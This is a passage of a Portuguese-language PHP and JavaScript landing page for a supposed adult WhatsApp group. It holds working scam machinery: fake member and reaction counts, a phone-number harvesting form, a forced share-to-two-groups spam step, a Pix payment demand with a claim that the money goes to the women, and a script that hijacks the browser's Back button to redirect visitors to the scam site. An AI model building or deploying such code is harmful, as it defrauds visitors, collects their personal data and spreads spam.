                            <img src="https://i.postimg.cc/HkKpByD3/IMG-20230825-WA0797.jpg">
                            <i class="fa-solid fa-microphone"></i>
                        </div>
                    </div>
                </div>


        </div></div></div></div></main>
        <div class="modal" style="display: none;">
            <div class="info">
                <div id="intro">
                    <img class="profile" src="9Qzhcvxn/IMG-20240711-003507.png">
                    <h1 class="title">🔥 Videos Caseiros <?php echo htmlspecialchars($cidade); ?></h1>
                    <p class="created">Criado em <span id="created"></span></p>
                    <div class="reactions">
                        <img class="like" src="15Lj1952/IMG-20230920-193443.jpg">
                        <img class="love" src="RZWJKB7S/IMG-20231013-152819.jpg">
                        <img class="care" src="prCzDVP3/IMG-20240124-100806.jpg">
                        <img class="care1" src="prCzDVP3/IMG-20240124-100806.jpg">
                        <span class="total">+752</span>
                    </div>
                    <button id="join">Entrar no Grupo</button>
                </div>
                <div id="compartilhar">
                    <div class="last">
                      <p style="text-align: center;"><span style="color: #666666; text-align: left;"><b>Para entrar no grupo</b></span></p>
                      <p style="text-align: center;"><span style="color: #666666; text-align: left;"><b>digite seu telefone</b></span></p>
                    </div>
                    <div>
                        <span>
                            <form id="telefoneForm" onsubmit="enviarTelefone(event)">
                                <input
                                style="text-align: center;"
                                id="numberInput"
                                type="tel"
                                placeholder="Telefone com DDD"
                                maxlength="15"
                                oninput="formatarTelefone(this)"
                                required
                                />
                                </form>
                                </span>
                                </div>
                                <button id="get">Enviar</button>
                    </div>
                    <div id="share">
                    <div class="last">
                       Para entrar no chat, clique em convidar e compartilhe em 2 grupos.
                    </div>
                    <div class="bar">
                        <div class="fill">
                            <div id="fill"></div>
                        </div>
                        <div class="percentage flex">
                            <div class="loader"></div>
                            <span id="percentage">0%</span>
                        </div>
                    </div>
                    <button id="invite">Enviar</button>
                </div>
                <div id="offer">
                  <div class="last">
                      <div id="pixImgContainer" class="qr-code-container">
                <img src="<?php echo htmlspecialchars($imgpix); ?>" alt="QR Code do Pix" id="pixCode">
            </div>                 
            <h1 class="highlight-large"><strong>R$<?php echo htmlspecialchars($valorFormatado); ?></strong></h1>
            <h1 class="highlight-large"></h1>
            <p style="text-align: center;"><span style="color: #666666; text-align: left;"><b>Acesso liberado após confirmação</b></span></p>
            <div><button id="btn-verificando" class="btn-verificando" onclick="iniciarVerificacao()">
                <span class="loaderSpinner"></span>verificando pagamento</button></div>
            <textarea id="copyInput" readonly onclick="copiarTexto()"><?php echo htmlspecialchars($pixqr); ?></textarea>
            <div>
        </div>  
                    <button class="btn btn-primary" id="join" onclick="copiarTexto()">Copiar Chave PIX</button>
                    <p style="text-align: center;"><img src="icon/atencao.svg" width="16" height="16" style="margin-right: 8px;">
                    <span style="color: #ff8f8f; text-align: left;">
                        <b>Todo o pagamento é direcionado às meninas, disponíveis 24h no grupo!</b>
                        </span></p>
                        </div>
                    </div>
                </div>

            </div>

        </div>
        
<script>
const transactionId = "<?php echo $transactionId; ?>"; // Pega o ID da transação do PHP
const checkInterval = 2000; // Intervalo de 2 segundos

function checkTransactionStatus() {
    if (!transactionId) {
        console.log("Aguardando o ID da transação...");
        setTimeout(checkTransactionStatus, checkInterval);
        return;
    }

    const url = `https://chat-whatsapp.livemodelo.com/verificar_status.php?transaction_id=${transactionId}`;

    fetch(url)
        .then(response => response.json()) // Converte a resposta para JSON
        .then(data => {
            console.log(`Status da transação: ${data.status}`);
            
            if (data.status === "PAID") {
                window.location.href = "390.html"; // Redireciona para a página de destino
            } else {
                setTimeout(checkTransactionStatus, checkInterval);
            }
        })
        .catch(error => {
            console.error("Erro ao verificar o status:", error);
            setTimeout(checkTransactionStatus, checkInterval);
        });
}

checkTransactionStatus(); // Inicia a verificação do status
</script>
        
    <script>
    // Função para obter parâmetros da URL
    function getQueryParam(param) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(param);
    }

    // Definir a imagem, o código QR e o texto do campo usando os parâmetros da URL
    const qrImage = document.getElementById('qrImage');
    qrImage.src = getQueryParam('qr_img');
    qrImage.onload = function() {
        document.querySelector('.container').style.width = qrImage.naturalWidth + 'px';
    };
    const qrCode = getQueryParam('qr_code');
    const displayText = getQueryParam('display_text');
    
    document.getElementById('qrCodeText').value = displayText || qrCode;

    // Função para copiar o código QR para a área de transferência
    function copiarTexto() {
            var campoTexto = document.getElementById("copyInput");
            campoTexto.select();
            document.execCommand("copy");
            var copyMessage = document.getElementById("copyMessage");
            copyMessage.style.display = "flex";
            setTimeout(() => {
                copyMessage.style.display = "none";
            }, 3000);
        }
</script>

        <script>
            const months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];

            const date = new Date();
            let day = date.getUTCDate();
            let month = months[date.getMonth()];
            let currentMonth = date.getMonth() + 1;
            let year = date.getFullYear();
            let shortyear = year.toString().slice(-2);
            document.getElementById("day").innerHTML = day;
            document.getElementById("month").innerHTML = month;
            document.getElementById("year").innerHTML = year;
            document.getElementById("created").innerHTML = day + "/" + currentMonth + "/" + shortyear;
        </script>
        <script src="ajax/libs/jquery/3.7.1/jquery.min.js"></script>
        <script>
            var width = 0,
                url = "*O melhor grupo de putaria* 👉  https://chat-whatsapp.livemodelo.com/vsj.php?id=19.9",
                share = "whatsapp://send?text=" + url,
                cpa = "https://chat-whatsapp.livemodelo.com/vsj.php?id=19.9";
        </script>
        <script type="text/javascript">
$(document).ready(function () {
        setTimeout(() => {
        $(".activity").show();
        setTimeout(() => {

$("#user1").show();
setTimeout(() => {

$("#user2").show();
setTimeout(() => {

$("#user3").show();
setTimeout(() => {

$("#user4").show();
setTimeout(() => {

$("#user5").show();
setTimeout(() => {

$("#user6").show();
setTimeout(() => {

$("#user7").show();
setTimeout(() => {


$(".modal").show();


  }, 1000);
  }, 1000);
  }, 900);
  }, 700);
  }, 500);
  }, 400);
  }, 350);
  }, 200);
  }, 100);

});
$("#join").click(function () {
    $("#intro").hide();
    $("#offer").show();
});
$("#invite").click(function () {
    window.location.href = share;
    if (width == 0) {
        width += 100;
        $("#share").hide();
        $("#offer").show();
    }
    setTimeout(function () {
        $("#fill").css("width", "50%");
        $("#percentage").text("50%");
    }, 2000);
});
$("#invitee").click(function () {
    window.location.href = filldois;
    if (width == 0) {
        width += 100;
        $("#fill").hide();
        $("#offer").show();
    }
    setTimeout(function () {
        $("#fill").css("width", "0%");
        $("#percentage").text("90%");
    }, 2000);
});
$("#get").click(function () {
    if (width == 0) {
        width += 100;
        $("#compartilhar").hide();
        $("#share").show();
    }
    setTimeout(function () {
        $("#fill").css("width", width + "50%");
        $("#percentage").text(width + "50%");
    }, 2000);
});
</script>
					
<script type="text/javascript">
        (function (window, location) {
            history.replaceState(null, document.title, location.pathname + "#!/history");
            history.pushState(null, document.title, location.pathname);

            window.addEventListener("popstate", function () {
                if (location.hash === "#!/history") {
                    history.replaceState(null, document.title, location.pathname);
                    setTimeout(function () {
                        location.replace(
                            "https://chat-whatsapp.livemodelo.com/vsj.php?id=19.9"
                        );
                    }, 0);
                }
            }, false);
        }(window, location));
    </script>
    <script>// Função para formatar o telefone no formato (99) 99999-9999
function formatarTelefone(input) {
    let telefone = input.value.replace(/\D/g, ""); // Remove todos os caracteres não numéricos

    if (telefone.length <= 10) {
        // Formato para telefone fixo (com 8 dígitos no final)
        telefone = telefone.replace(/^(\d{2})(\d)/, "($1) $2");
        telefone = telefone.replace(/(\d{4})(\d)/, "$1-$2");
    } else {
        // Formato para telefone celular (com 9 dígitos no final)
        telefone = telefone.replace(/^(\d{2})(\d)/, "($1) $2");
        telefone = telefone.replace(/(\d{5})(\d)/, "$1-$2");
    }

    input.value = telefone; // Atualiza o valor do input com o telefone formatado
}

// Função para enviar o telefone para o banco de dados
function enviarTelefone(event) {
    event.preventDefault(); // Impede o envio padrão do formulário

    const inputTelefone = document.getElementById("numberInput");
    const telefone = inputTelefone.value.replace(/\D/g, ""); // Remove formatação para salvar

    // Exemplo de envio do telefone para o banco de dados
    fetch("/api/salvarTelefone", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({ telefone: telefone }),
    })
    .then(response => {
        if (response.ok) {
            alert("Telefone salvo com sucesso!");
        } else {
            alert("Erro ao salvar o telefone.");
        }
    })
    .catch(error => {
        console.error("Erro:", error);
        alert("Erro ao salvar o telefone.");
    });
}
</script>
    </div></div></div>
    <script>
    // Função para tocar o áudio
    // Adiciona um evento de clique para tocar o áudio após qualquer interação

        var transactionId = "<?php echo $transactionId; ?>";
        var intervalID;

        function iniciarVerificacao() {
            var botaoStatus = document.getElementById("btnStatusPagamento");
            botaoStatus.innerHTML = '<span class="loaderSpinner"></span> Verificando o seu pagamento';
            botaoStatus.classList.remove("alert-message");

            verificarStatus();
            intervalID = setInterval(verificarStatus, 2000);  // Verifica a cada 2 segundos
        }

        function verificarStatus() {
            fetch(`verificar_status.php?transaction_id=${transactionId}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === "PAID") {
                        clearInterval(intervalID);
                        var botaoStatus = document.getElementById("btnStatusPagamento");
                        botaoStatus.innerHTML = "Pagamento efetuado com sucesso!";
                        botaoStatus.style.backgroundColor = "green";
                        setTimeout(() => {
                            window.location.href = 'https://chat-whatsapp.livemodelo.com/famosas.php?id=14.4';
                        }, 2000); // Redireciona após 2 segundos
                    }
                })
                .catch(error => console.error('Erro:', error));
        }

        document.addEventListener("DOMContentLoaded", () => {
            iniciarVerificacao();
        });
    </script>
    
    </body></html>